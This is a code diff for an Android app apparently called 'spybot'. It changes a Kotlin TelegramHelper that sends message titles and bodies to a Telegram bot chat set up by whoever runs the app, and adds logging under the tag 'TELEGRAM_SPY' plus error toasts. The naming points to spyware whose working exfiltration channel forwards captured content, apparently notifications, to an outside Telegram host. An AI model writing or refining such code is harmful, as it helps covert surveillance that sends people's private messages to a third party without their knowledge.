@@ -1,6 +1,10 @@
 package com.example.spybot.helper
 
 import android.content.Context
+import android.os.Handler
+import android.os.Looper
+import android.util.Log
+import android.widget.Toast
 import com.example.spybot.network.TelegramApiService
 import com.example.spybot.utils.AppPreferences
 import com.example.spybot.utils.TelegramResponse
@@ -16,6 +20,7 @@ import java.util.concurrent.TimeUnit
 object TelegramHelper {
 
     private const val BASE_URL = "https://api.telegram.org/"
+    private const val TAG = "TELEGRAM_SPY"
 
     private val logging = HttpLoggingInterceptor().apply {
         level = HttpLoggingInterceptor.Level.BODY
@@ -40,6 +45,7 @@ object TelegramHelper {
         val chatId = AppPreferences.getChatId(context) ?: ""
 
         if (token.isEmpty() || chatId.isEmpty()) {
+            Log.e(TAG, "Token or Chat ID is empty! Please configure first.")
             return
         }
 
@@ -48,20 +54,30 @@ object TelegramHelper {
                 "<b>Title:</b> $title\n" +
                 "<b>Body:</b> $body"
 
-        // Telegram URL me bot token pass karna zaroori hai
         val endpointUrl = "https://api.telegram.org/bot$token/sendMessage"
 
         try {
-            apiService.sendMessage(endpointUrl, chatId, message).enqueue(object : Callback<TelegramResponse> {
+            apiService.sendMessage(endpointUrl, chatId, message, "HTML").enqueue(object : Callback<TelegramResponse> {
                 override fun onResponse(call: Call<TelegramResponse>, response: Response<TelegramResponse>) {
-                    // Success
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Sent to Telegram successfully!")
+                    } else {
+                        val errorBody = response.errorBody()?.string()
+                        Log.e(TAG, "Telegram API Error [${response.code()}]: $errorBody")
+                        
+                        // Screen par toast dikhayega agar Telegram ne mana kiya (e.g. Chat not found / Unauthorized)
+                        Handler(Looper.getMainLooper()).post {
+                            Toast.makeText(context, "Telegram Error: ${response.code()}", Toast.LENGTH_SHORT).show()
+                        }
+                    }
                 }
 
                 override fun onFailure(call: Call<TelegramResponse>, t: Throwable) {
-                    t.printStackTrace()
+                    Log.e(TAG, "Network connection error: ${t.message}")
                 }
             })
         } catch (e: Exception) {
+            Log.e(TAG, "Exception: ${e.message}")
             e.printStackTrace()
         }
     }
